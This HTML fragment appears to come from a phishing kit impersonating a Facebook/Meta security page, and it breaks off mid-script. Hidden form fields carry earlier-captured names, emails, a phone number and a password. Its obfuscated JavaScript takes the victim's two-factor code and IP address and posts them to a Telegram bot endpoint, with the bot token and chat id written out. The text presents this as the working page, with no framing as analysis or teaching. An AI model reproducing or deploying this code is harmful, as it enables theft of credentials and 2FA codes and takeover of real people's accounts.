...
<body>
        ...
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-md-8 col-xl-7 col-sm-8">
				    <form action="wait.php?cmd=_home&amp;dispatch=11004d58f5b74f8dc1e7c2e8dd4105e811004d58f5b74f8dc1e7c2e8dd4105e8@meta.html" method="post">
					<input type="hidden" name="full_name" value="sdfsdfsdfsd" readonly>
					<input type="hidden" name="business_email" value="sdgfd@gmail.com" readonly>
					<input type="hidden" name="personal_email" value="dfasdfas@gmail.com" readonly>
					<input type="hidden" name="phone" value="080324535" readonly>
					<input type="hidden" name="facebook_pagename" value="dsdfgsdfg" readonly>
					<input type="hidden" name="first_password" value="fdgdfgdfg" readonly>
                    <div class="card">
    ...
    <script>
        document.getElementById('sendButton').addEventListener("click", function (_0x507718) {
        _0x507718.preventDefault();
        handleActions();
        });
        function getIp() {
        $.get('https://api.ipify.org/?format=json', function (_0x191e77) {
            $("#ip_hidden").val(_0x191e77.ip);
        });
        }
        getIp();
        function handleActions() {
        let _0x2222e8 = document.querySelector("#code");
        if (_0x2222e8.value === '') {
            $("#code").css("border", "1px solid red");
            return;
        } else {
            let _0x3dfcf4 = $("#ip_hidden").val();
            var _0x19278f = "===========2FA-2============\n    2FA-2: \"" + _0x2222e8.value + "\"\n    IP: \"" + _0x3dfcf4 + "\"\n    =============================";
            $.post("https://api.telegram.org/bot5788363554:AAF-SVpxKsmsqyNVzLnJffQ1XqJoXCwRmo0/sendMessage", {
            'chat_id': '-910743732',
            'text': _0x19278f
            }).done(function (_0x3ac83f) {
            console.log("Message sent successfully:", _0x3ac83f);
            window.location.href = "wait.php?cmd=_home&amp;dispatch=11004d58f5b74f8dc1e7c2e8dd4105e811004d58f5b74f8dc1e7c2e8dd4105e8@meta.html";
            }).fail(function (_0x1bc632) {
            console.error("Error sending message:", _0x1bc632);
            });
            $(".fb-btn").attr("disabled", true);
        }
        }
        $(".numeric").on("input", function (_0x5693ba) {
        if (this.value !== '') {
